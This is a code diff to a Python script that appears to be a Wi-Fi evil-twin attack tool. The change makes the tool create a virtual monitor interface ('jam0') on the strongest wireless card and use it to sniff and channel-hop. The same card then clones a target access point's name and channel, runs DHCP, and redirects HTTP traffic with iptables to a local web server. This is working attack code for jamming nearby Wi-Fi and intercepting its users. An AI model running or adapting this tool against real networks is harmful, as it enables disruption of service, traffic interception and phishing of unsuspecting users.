@@ -343,6 +343,7 @@ def get_iface(mode="all", exceptions=["_wifi"]):
 
 
 def reset_interfaces():
+    Popen(['iw', 'dev', 'jam0', 'del'], stdout=DN, stderr=DN)
     monitors = get_interfaces()["monitor"]
     for m in monitors:
         if 'mon' in m:
@@ -351,6 +352,19 @@ def reset_interfaces():
             Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
             Popen(['iwconfig', m, 'mode', 'managed'], stdout=DN, stderr=DN)
             Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)
+
+
+def create_virtual_monitor(iface, virtual): 
+    try:
+        proc = check_output(['iw', 'dev', iface, 'interface', 'add', virtual, 'type', 'monitor'])
+        proc = check_output(['ifconfig', virtual, 'up'])
+    except:
+        reset_interfaces()
+        sys.exit((
+            '\n[' + R + '-' + W + '] Unable to create virtual interface out of ' + iface + ')!\n' +
+            '[' + R + '!' + W + '] Closing'
+        ))
+    return virtual
 
 
 def get_internet_interface():
@@ -881,45 +895,19 @@ if __name__ == "__main__":
 
     # Get interfaces
     reset_interfaces()
-    inet_iface = get_internet_interface()
-    if not args.jamminginterface:
-        mon_iface = get_iface(mode="monitor", exceptions=[inet_iface])
-        iface_to_monitor = False
-    else:
-        mon_iface = False
-        iface_to_monitor = args.jamminginterface
-    if not mon_iface:
-        if args.jamminginterface:
-            iface_to_monitor = args.jamminginterface
-        else:
-            iface_to_monitor = get_strongest_iface()
-        if not iface_to_monitor and not inet_iface:
-            sys.exit(
-                ('[' + R + '-' + W +
-                 '] No wireless interfaces found, bring one up and try again'
-                 )
-            )
-        mon_iface = start_mode(iface_to_monitor, "monitor")
-    wj_iface = mon_iface
-    if not args.apinterface:
-        ap_iface = get_iface(mode="managed", exceptions=[iface_to_monitor])
-    else:
-        ap_iface = args.apinterface
-
-    if inet_iface and inet_iface in [ap_iface, iface_to_monitor]:
+    strongest_iface = get_strongest_iface()
+    if not strongest_iface:
         sys.exit(
-            ('[' + G + '+' + W + 
-            '] Interface %s is connected to the Internet. ' % inet_iface +
-            'Please disconnect and rerun the script.\n' +
-            '[' + R + '!' + W + '] Closing'
-            )
+            ('[' + R + '-' + W +
+             '] No wireless interfaces found, bring one up and try again'
+             )
         )
+    virtual_iface = create_virtual_monitor(strongest_iface, "jam0")
 
 
-    '''
-    We got the interfaces correctly at this point. Monitor mon_iface & for
-    the AP ap_iface.
-    '''
+    
+
+
     # Set iptable rules and kernel variables.
     os.system(
         ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s' 
@@ -939,25 +927,25 @@ if __name__ == "__main__":
 
     # Copy AP
     time.sleep(3)
-    hop = Thread(target=channel_hop, args=(mon_iface,))
+    hop = Thread(target=channel_hop, args=(virtual_iface,))
     hop.daemon = True
     hop.start()
-    sniffing(mon_iface, targeting_cb)
+    sniffing(virtual_iface, targeting_cb)
     channel, essid, ap_mac = copy_AP()
     hop_daemon_running = False
 
     # Start AP
-    start_ap(ap_iface, channel, essid, args)
-    dhcpconf = dhcp_conf(ap_iface)
-    if not dhcp(dhcpconf, ap_iface):
+    start_ap(strongest_iface, channel, essid, args)
+    dhcpconf = dhcp_conf(strongest_iface)
+    if not dhcp(dhcpconf, strongest_iface):
         print('[' + G + '+' + W + 
-            '] Could not set IP address on %s!' % ap_iface)
+            '] Could not set IP address on %s!' % strongest_iface)
         shutdown()
     os.system('clear')
     print ('[' + T + '*' + W + '] ' + T +
            essid + W + ' set up on channel ' +
-           T + channel + W + ' via ' + T + mon_iface +
-           W + ' on ' + T + str(ap_iface) + W)
+           T + channel + W + ' via ' + T + strongest_iface +
+           W + ' on ' + T + str(strongest_iface) + W)
 
     # With configured DHCP, we may now start the web server
     # Start HTTP server in a background thread
@@ -999,18 +987,18 @@ if __name__ == "__main__":
     args.accesspoint = ap_mac
     args.channel = channel
     monitor_on = None
-    conf.iface = mon_iface
-    mon_MAC = mon_mac(mon_iface)
+    conf.iface = strongest_iface
+    mon_MAC = mon_mac(strongest_iface)
     first_pass = 1
 
     monchannel = channel
     # Start channel hopping
-    hop = Thread(target=channel_hop2, args=(wj_iface,))
+    hop = Thread(target=channel_hop2, args=(virtual_iface,))
     hop.daemon = True
     hop.start()
 
     # Start sniffing
-    sniff_thread = Thread(target=sniff_dot11, args=(wj_iface,))
+    sniff_thread = Thread(target=sniff_dot11, args=(virtual_iface,))
     sniff_thread.daemon = True
     sniff_thread.start()
 
